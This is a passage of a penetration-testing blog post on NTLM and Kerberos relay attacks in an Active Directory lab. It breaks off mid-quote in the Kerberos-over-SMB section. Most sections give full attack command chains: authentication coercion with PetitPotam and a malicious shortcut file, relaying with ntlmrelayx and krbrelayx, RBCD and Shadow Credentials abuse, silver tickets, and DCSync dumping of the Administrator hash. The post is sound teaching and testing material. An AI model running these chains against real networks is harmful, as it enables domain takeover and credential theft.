---
layout: post
title: The Basics of NTLM/Kerberos Relays
description: A technical overview of NTLM and Kerberos relay attacks

date: 2025-10-29 06:00:00 +0900
image:
    path: /assets/img/20251029/84.png
---

I just want to clarify conditions and steps to exploit relay attacks. Each technique has already been described in other amazing articles. The basics of relay attacks are described in ["NTLM Relay"](https://en.hackndo.com/ntlm-relay/) by Pixis. If you are not familiar with relay attacks, I recommend reading this article.

## Table of Contents
1. [Lab](#lab)
2. [NTLM Relay to SMB](#ntlm-relay-to-smb)
3. [NTLM Relay to LDAP/LDAPS](#ntlm-relay-to-ldapldaps)
4. [NTLM Relay to HTTP/HTTPS](#ntlm-relay-to-httphttps)
5. [NTLM Relay to WinRM/WinRMS](#ntlm-relay-to-winrmwinrms)
6. [NTLM Relay to MSSQL](#ntlm-relay-to-mssql)
7. [Kerberos Relay over DNS](#kerberos-relay-over-dns)
8. [Kerberos Relay over SMB (Patched)](#kerberos-relay-over-smb-patched)
9. [Kerberos Relay over HTTP](#kerberos-relay-over-http)
10. [Kerberos Relay to SMB and LDAP/LDAPS](#kerberos-relay-to-smb-and-ldapldaps)
11. [Mitigations](#mitigations)
12. [Conclusion](#conclusion)

## Lab
This is the overview of the lab. I will demonstrate NTLM/Kerberos relay attacks from DC1/WKS to DC2/CA. In this blog, DC1 and DC2 are sometimes used as synonyms for the relay source and the relay target respectively.
<div style="text-align: center; margin: -1.5em 0 20px 0;">
  <img src="/assets/img/20251029/84.png" width="600" style="" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Lab</div>
</div>

<p style="margin-bottom:0.25em">
There are 2 accounts in this lab:
</p>
- coward — a standard user
- Administrator — a domain admin

The goal is to escalate from coward to Administrator.

## NTLM Relay to SMB
#### Prerequisites
SMB signing must not be required to perform the relay attack. Historically, only domain controllers required SMB signing by default. However, since Windows Server 2025 and Windows 11 24H2, SMB signing has been required by default for all SMB connections.
```sh
netexec smb dc2.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/3.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">SMB signing is not required</div>
</div>

#### Examples
NTLM relay to SMB is pretty simple, but examples which can be **actively** exploited are somewhat limited. This is because only machine accounts can be coerced to initiate NTLM authentication without user interaction. However, exploiting machine account privileges on SMB is challenging. Even domain controllers lack special privileges over each other, and it is rare for a machine account to have administrator/exploitable rights on another server.  

The [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager) project introduces some examples. For example, a site server's machine account may have administrator privileges on other related servers, and under such conditions, NTLM relay to SMB can be actively exploited.

In this section, I'll use a link file to coerce user authentication. The process is straightforward: place a malicious link file in a shared folder, as described in [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land#shortcut-files-scf-lnk-url). Once placed, any user who opens the folder will automatically authenticate to us. In this example, Administrator opens the folder and we relay the authentication with [Impacket](https://github.com/fortra/impacket)'s ntlmrelayx.py.
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Windows\temp\@Salaries-2023.lnk")
$lnk.TargetPath = "\\<attacker ip>\@icon.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Salaries-2023."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/36.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Creating a malicious link file</div>
</div>

```sh
sudo python3 ntlmrelayx.py -smb2support -t smb://dc2.kawakatz.local -c whoami
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/37.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Deployed link file</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/38.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to SMB</div>
</div>

## NTLM Relay to LDAP/LDAPS
#### Prerequisites
LDAP signing or LDAP channel binding must not be required to perform the relay attack. Historically this was the default. However, since Windows Server 2025, LDAP signing is required by default and channel binding is enabled in "When supported" mode. We can check these settings with [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan). [This patch](https://github.com/zyn3rgy/LdapRelayScan/pull/27) may be required to support LDAPS. Additionally, some other complicated conditions must also be met as described below.
```sh
python3 LdapRelayScan.py -method BOTH -dc-ip <dc ip> -u coward -p 'P@ssw0rd'
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/31.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP signing and LDAP channel binding are not required</div>
</div>

#### Examples
NTLM relay to LDAP is somewhat tricky. The details are described again in ["NTLM Relay"](https://en.hackndo.com/ntlm-relay/) by Pixis. During NTLM authentication, clients and servers indicate whether they support signing using the NEGOTIATE_SIGN flag. LDAP decides whether it uses LDAP signing based on the flag. LDAP servers always support LDAP signing (NEGOTIATE_SIGN = 1), so clients must set the flag to 0 to avoid LDAP signing. However, Windows' SMB clients set the flag to 1. We cannot overwrite the flag without breaking MIC (Message Integrity Code). We cannot simply drop the MIC because the msAvFlags indicates the presence of the MIC. We cannot overwrite the msAvFlags because the modification invalidates the NetNTLMv2 hash we want to relay. Of course, we cannot recalculate the NTLMv2 hash because we don't know the user's secret.

<p style="margin-bottom:0.25em">
So, to perform NTLM relay over SMB to LDAP/LDAPS, more conditions must be met. We can drop the MIC when:
</p>
- DC2 allows the Drop the MIC attack (e.g., CVE-2019-1040)
- DC1 allows NTLMv1 authentication (LmCompatibilityLevel<sup>*</sup> <= 2)

<p style="margin-bottom:0em"><em>* LmCompatibilityLevel</em></p>
```registry
Key: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa  
Name: LMCompatibilityLevel  
Type: REG_DWORD  
```

In these cases, we can use ntlmrelayx.py with --remove-mic. 

[CVE-2019-1040 scanner](https://github.com/fox-it/cve-2019-1040-scanner) or similar tools can be used to check for Drop the MIC vulnerabilities.

To verify LmCompatibilityLevel <= 2, we need to receive NTLM authentication from DC1. [“Practical Attacks against NTLMv1"](https://trustedsec.com/blog/practical-attacks-against-ntlmv1) by TrustedSec shows that LmCompatibilityLevel <= 2 is risky regardless of LDAP. Even if LmCompatibilityLevel == 5 on DC2 (which means incoming NTLMv1 authentication is not allowed), that doesn't prevent the attack.  
```sh
# NTLMv1 hash will be captured if LmCompatibilityLevel <= 2
sudo python3 Responder.py -I ens33
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip> dc1.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/50.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">When LmCompatibilityLevel <= 2</div>
</div>

The primary communication channels between DC1 and us are SMB (as already mentioned) and HTTP. To coerce NTLM authentication over HTTP, the WebClient service must be enabled on DC1. You can verify whether it's enabled by enumerating named pipes on DC1 as [posted](https://x.com/tifkin_/status/1419806476353298442) by @tifkin_. This check is also implemented as a NetExec module. NTLM authentication over HTTP is attractive for relay because the protocol itself has no message-signing capability, unlike SMB/LDAP. In practice, this results in NEGOTIATE_SIGN = 0 and makes the relay work regardless of the conditions mentioned above.
```sh
netexec smb dc1.kawakatz.local -u coward -p 'P@ssw0rd' -M webdav
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/35.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NetExec WebDAV module</div>
</div>

It's quite rare to see the WebClient service enabled. For that reason, we often choose NTLM relay over SMB. When we use a compromised Windows device to relay, we need to listen on 445/tcp to receive SMB traffic. Since Windows itself already binds that port, we must first free or hijack it. If we have local administrator privileges on the device, a technique introduced in ["Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac) by SpecterOps can be useful. Alternatively, when we lack local administrator privileges, we can connect our device directly to the target network via VPN.

To coerce NTLM authentication over SMB or HTTP, we can use tools such as [PetitPotam](https://github.com/topotam/PetitPotam) and [Coercer](https://github.com/p0dalirius/Coercer). I won't cover their internals — we only need SMB access to DC1. 

We can exploit NTLM relay to LDAP/LDAPS using the RBCD technique as follows. Remember that LmCompatibilityLevel <= 2 must be met for relay over SMB. If relaying over HTTP, we can remove --remove-mic. For more details on RBCD, see ["(RBCD) Resource-based constrained"](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) from The Hacker Recipes.
```sh
# Add a machine account to abuse
# Prereq: MachineAccountQuota >= 1 (default 10)
# Check: netexec ldap dc1.kawakatz.local -u coward -p 'P@ssw0rd' -M maq
python3 addcomputer.py -computer-name 'KAWAPC$' -computer-pass 'P@ssw0rd' kawakatz.local/coward:'P@ssw0rd' -dc-ip <dc ip>

# NTLM relay to LDAP for RBCD
sudo python3 ntlmrelayx.py -smb2support -t ldap://dc2.kawakatz.local --remove-mic --delegate-access --escalate-user 'KAWAPC$' --no-dump --no-da --no-acl --no-validate-privs
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip> dc1.kawakatz.local
sudo python3 rbcd.py -delegate-to 'DC1$' -action read kawakatz.local/coward:'P@ssw0rd' -dc-ip <dc ip>

# Impersonate Administrator
sudo python3 getST.py -spn cifs/dc1.kawakatz.local kawakatz.local/'KAWAPC$':'P@ssw0rd' -impersonate Administrator -dc-ip <dc ip>
export KRB5CCNAME=Administrator@cifs_dc1.kawakatz.local@KAWAKATZ.LOCAL.ccache
sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/11.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a machine account</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/4.png" width="720" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing NTLM authentication over SMB</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/12.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to LDAP with NTLMv1</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/13.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
</div>

When we cannot add a computer account, we can instead exploit NTLM relay to LDAP/LDAPS using the Shadow Credentials technique, as follows. For more details on Shadow Credentials and the technique to generate silver tickets, see ["Shadow Credentials"](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials), ["UnPAC the hash"](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash), and ["Silver tickets"](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) from The Hacker Recipes.
```sh
# NTLM relay to LDAP for Shadow Credentials
sudo python3 ntlmrelayx.py -smb2support -t ldap://dc2.kawakatz.local --remove-mic --shadow-credentials --shadow-target 'DC1$' --no-dump --no-da --no-acl --no-validate-privs
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip> dc1.kawakatz.local

# Issue a TGT with the certificate for Shadow Credentials
# https://github.com/dirkjanm/PKINITtools
python3 gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <pfx pass> kawakatz.local/'DC1$' /tmp/DC1.ccache -dc-ip <dc ip>

# Abuse UnPAC the Hash and generate a silver ticket to impersonate Administrator
export KRB5CCNAME=/tmp/DC1.ccache
python3 getnthash.py -key <key from gettgtpkinit.py> -dc-ip <dc ip> kawakatz.local/'DC1$'
sudo python3 ticketer.py -domain-sid <domain sid> -domain kawakatz.local -spn cifs/dc1.kawakatz.local -nthash <dc1 hash> -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local

# Perform DCSync as another example
export KRB5CCNAME=/tmp/DC1.ccache
sudo python3 secretsdump.py -k -no-pass kawakatz.local/'DC1$'@dc2.kawakatz.local -just-dc-user Administrator
netexec smb <dc ip> -u Administrator -H <hash>
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/8.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to LDAP with NTLMv1</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/9.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/15.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Retrieving the NTLM hash of DC1$</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/16.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Generating a silver ticket</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/17.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/10.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Performing DCSync</div>
</div>

The image in ["NTLM relay"](https://www.thehacker.recipes/ad/movement/ntlm/relay) on The Hacker Recipes makes it easy to understand these conditions for NTLM relay to LDAP/LDAPS.

<p style="margin-bottom:0.25em">
It's important to mention the Intranet Zone. If a URL is handled as an Intranet Zone, WebDAV clients automatically start authentication. The most important rule is described in <a href="https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/">"The Renaissance of NTLM Relay Attacks: Everything You Need to Know"</a> by SpecterOps.
</p>
<blockquote style="margin-top:.5em">
The PlainHostName Rule (aka “The Dot Rule”): If the URL’s hostname does not contain any dots
</blockquote>

To satisfy this rule, we can add a DNS record or perform LLMNR spoofing. We also need to properly specify a listener. By default, Authenticated Users can add DNS records.
```sh
# Add a DNS record
python3 dnstool.py -u kawakatz.local\\coward -p 'P@ssw0rd' -a add -r attacker -d <attacker ip> dc2.kawakatz.local -dns-ip <dc ip>

# This won't work
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip>@80/share dc1.kawakatz.local
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' attacker.kawakatz.local@80/share dc1.kawakatz.local

# This works
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' attacker@80/share dc1.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/51.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a DNS record</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/53.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Invalid coercion</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/54.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Anonymous WebDAV access</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/55.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Valid coercion</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/56.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Authenticated WebDAV access</div>
</div>

NTLM relay over HTTP to LDAP is often exploited for local privilege escalation, as demonstrated in [NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self). By default, the WebClient service is not enabled on Windows, but if we register an ETW event trigger, Windows automatically enables the WebClient service. This method does not require local administrator privileges. Then, we can coerce NTLM authentication from the machine account over HTTP and relay it to LDAP. Using the techniques described above (RBCD or Shadow Credentials), we can take over the machine account and gain local administrator privileges.
```sh
# Build the BOF on Ubuntu
x86_64-w64-mingw32-gcc -c StartWebClientSvc.c -o StartWebClientSvc.x64.o
# Execute the BOF from NTLMRelay2Self
COFFLoader64.exe go StartWebClientSvc.x64.o

# NTLM relay to LDAP for Shadow Credentials
sudo python3 ntlmrelayx.py -smb2support -t ldap://dc2.kawakatz.local --shadow-credentials --shadow-target 'WKS$' --no-dump --no-da --no-acl --no-validate-privs
python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local <attacker ip>@80/share wks.kawakatz.local

# Abuse the certificate as above...
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/14.png" width="700" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Activating the WebClient service</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/39.png" width="750" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing NTLM authentication over HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/40.png" width="750" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over HTTP to LDAP</div>
</div>

## NTLM Relay to HTTP/HTTPS
#### Prerequisites
HTTP is generally vulnerable to relay attacks. EPA (Extended Protection for Authentication) must not be required to perform the relay attack. [Certipy](https://github.com/ly4k/Certipy) can be used to check EPA settings. Although Certipy is a toolkit for ADCS, the logic of [the check_channel_binding function](https://github.com/ly4k/Certipy/blob/main/certipy/commands/find.py#L684) can also be applied to general HTTPS endpoints.
```sh
certipy find -u coward -p 'P@ssw0rd' -dc-ip <dc ip>
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/66.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">HTTP and EPA check</div>
</div>

<p style="margin-bottom:0.25em">
If the AD CS Web Enrollment role is installed, the default configuration has historically been vulnerable to NTLM relay (ESC8). However, according to <a href="https://blog.redteam-pentesting.de/2025/windows-coercion/">"The Ultimate Guide to Windows Coercion Techniques in 2025"</a>,
</p>
<blockquote style="margin-top:.5em">
For the longest time, channel binding and EPA were disabled by default and they were rarely enabled manually. However, starting with Windows Server 2022 23H2 LDAP channel binding was activated by default and on Windows Server 2025, EPA was enabled by default and the unencrypted AD CS Web Enrollment API was disabled by default.
</blockquote>

#### Examples
<p style="margin-bottom:0.25em">
NTLM relay to HTTP/HTTPS is often used to attack:
</p>
- ADCS (ESC8, See ["Certified Pre-Owned"](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
- Configuration Manager (See the [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager) project)

HTTP itself has no message-signing capability, unlike SMB/LDAP, so these services are easy targets. Consider an example of ESC8. We can leverage a template that can be issued by domain controllers and used for client authentication, as follows.
```sh
# Find abusable templates
certipy find -u coward -p 'P@ssw0rd' -dc-ip <dc ip>

# NTLM relay to HTTP
sudo python3 ntlmrelayx.py -t http://ca.kawakatz.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication -smb2support
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' <attacker ip> dc1.kawakatz.local

# Abuse the issued certificate in the same way as Shadow Credentials
# DCSync as an example.
python3 gettgtpkinit.py -cert-pfx '/tmp/DC1$.pfx' kawakatz.local/'DC1$' /tmp/DC1.ccache -dc-ip <dc ip>
export KRB5CCNAME=/tmp/DC1.ccache
python3 secretsdump.py -k -no-pass kawakatz.local/'DC1$'@dc2.kawakatz.local -just-dc-user Administrator
netexec smb <dc ip> -u Administrator -H <hash>
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/18.png" width="700" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">An abusable template</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/19.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/20.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/21.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Performing DCSync</div>
</div>

## NTLM Relay to WinRM/WinRMS
#### Prerequisites
Generally speaking, NTLM relay to WinRM is impossible because the protocol has its own encryption protecting against relay attacks. However, WinRM/S (WinRM over HTTPS) relies on TLS for encryption. This makes it vulnerable to relay attacks if NTLMv1 is allowed (LmCompatibilityLevel <= 2) on DC1. Even when relaying over HTTP, NTLMv1 is still required, unlike LDAP/LDAPS. This is because CbtHardeningLevel for WinRMS is not "None" but "Relaxed". WinRMS attempts to use CBT if it receives NTLMv2 authentication. ["Is TLS more secure, the WinRMS case."](https://blog.whiteflag.io/blog/is-tls-more-secured-the-winrms-case/) provides a good reference.

#### Examples
```sh
# We can use a link file as before to coerce user authentication over SMB
# NTLM relay to WinRMS
sudo python3 ntlmrelayx.py -smb2support -t winrms://dc2.kawakatz.local
nc 127.0.0.1 11000
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/46.png" width="700" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Deployed link file</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/44.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to WinRMS</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/47.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over HTTP to WinRMS</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/45.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Interactive shell</div>
</div>

With Microsoft Edge, NTLM authentication over HTTP is started automatically if a URL is handled as an Intranet Zone. Otherwise, a prompt appears. This behavior is important for coercing user authentication over HTTP. As described above, LmCompatibilityLevel <= 2 must be met. In the images below, LmCompatibilityLevel == 5 and the relay attack failed because CBT was used with NTLMv2.
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/57.png" width="550" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">URL in Intranet Zone</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/59.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Authenticated access</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/58.png" width="550" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">URL out of Intranet Zone</div>
</div>

NTLM relay to WinRMS is technically interesting, but it's quite rare that WinRMS is enabled. For user authentication over HTTP, there are some interesting articles like ["WSUS Is SUS: NTLM Relay Attacks in Plain Sight"](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight) and ["Taking the relaying capabilities of multicast poisoning to the next level: tricking Windows SMB clients into falling back to WebDav"](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking).

## NTLM Relay to MSSQL
#### Prerequisites
MSSQL adopts TLS, but EPA is disabled by default, making it vulnerable to relay attacks. This relay attack does not require NTLMv1 or HTTP authentication.

#### Examples
NTLM relay to MSSQL is uncommon, but [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md) in the Misconfiguration Manager project is a good example.
```sh
# NTLM relay to MSSQL
sudo python3 ntlmrelayx.py -smb2support -t mssql://dc2.kawakatz.local -i
nc 127.0.0.1 11000
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/48.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay over SMB to MSSQL</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/49.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Interactive shell</div>
</div>

# Kerberos Relay
Kerberos relay is similar to NTLM relay, but it has its own challenges. "2. Kerberos relaying : state of the art" in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with) describes this perfectly. In short, asking DC1 to send us an AP-REQ that includes a service ticket for DC2/CA is not a simple task. We need some tricks described below to achieve this. James Forshaw published some ideas in ["Using Kerberos for Authentication Relay Attacks"](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), and researchers have since implemented tools based on these techniques to achieve Kerberos relay.

## Kerberos Relay over DNS
Kerberos relay over DNS is described in ["Relaying Kerberos over DNS using krbrelayx and mitm6"](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/). We can act as a DHCPv6 and DNS server by responding to a DHCP request with a spoofed response. Then, we can deny dynamic DNS updates to coerce Kerberos authentication with an SPN we control and relay the authentication.

#### Prerequisites
IPv6 must be enabled on WKS, and we must be on the same LAN as WKS to respond to DHCPv6 requests. DNS dynamic updates must be enabled, which is the default.

#### Examples
If a client sends a DHCPv6 request, we can respond with a spoofed response as a fake DHCPv6 server. The client mistakenly identifies us as a DNS server. When the client tries to update its DNS record dynamically, its machine account authenticates to DNS servers as part of the "Secure dynamic updates" operation.

Under these conditions, we can refuse the update and coerce the client to perform Kerberos authentication. If we impersonate ca.kawakatz.local as an example, the client will request a service ticket for DNS/ca.kawakatz.local and send an AP_REQ to us. We can then simply relay the AP_REQ.

Note that domain controllers cannot be targeted in this attack because they are DNS servers themselves and do not perform dynamic DNS updates.
```sh
# Kerberos relay over DNS to HTTP
python3 krbrelayx.py -smb2support -t http://ca.kawakatz.local/certsrv/certfnsh.asp --adcs --template Machine --victim wks.kawakatz.local -ip <attacker ip>
sudo mitm6 --domain kawakatz.local --host-allowlist wks.kawakatz.local --relay ca.kawakatz.local -v
python3 gettgtpkinit.py -pfx-base64 MII...9PCfs= 'kawakatz.local/WKS$' wks.ccache

# See https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse for details
# We can also use “UnPAC the hash” and “Silver tickets” as above
python3 gets4uticket.py 'kerberos+ccache://kawakatz.local\wks$:wks.ccache@dc1.kawakatz.local' cifs/wks.kawakatz.local@kawakatz.local Administrator@kawakatz.local /tmp/Administrator.ccache

export KRB5CCNAME=/tmp/Administrator.ccache
sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@wks.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/27.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Refusing a dynamic update</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/28.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over DNS to HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/29.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Issuing a TGT</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/30.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
</div>

## Kerberos Relay over SMB (Patched)
Kerberos relay over SMB was introduced in ["Relaying Kerberos over SMB using krbrelayx"](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) by Synacktiv. If we coerce Kerberos authentication to a specially crafted hostname, a client sends a valid AP_REQ to us. The AP_REQ can be simply relayed.

Since a patch for CVE-2025-33073 made this technique unusable, there are no known ways to perform Kerberos relay over SMB currently😢.

#### Prerequisites
We must be able to add a DNS record or perform LLMNR spoofing.

#### Examples
<p style="margin-bottom:0.25em">
This is the key trick of this technique as written in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">"Relaying Kerberos over SMB using krbrelayx"</a>.
</p>
<blockquote style="margin-top:.5em">
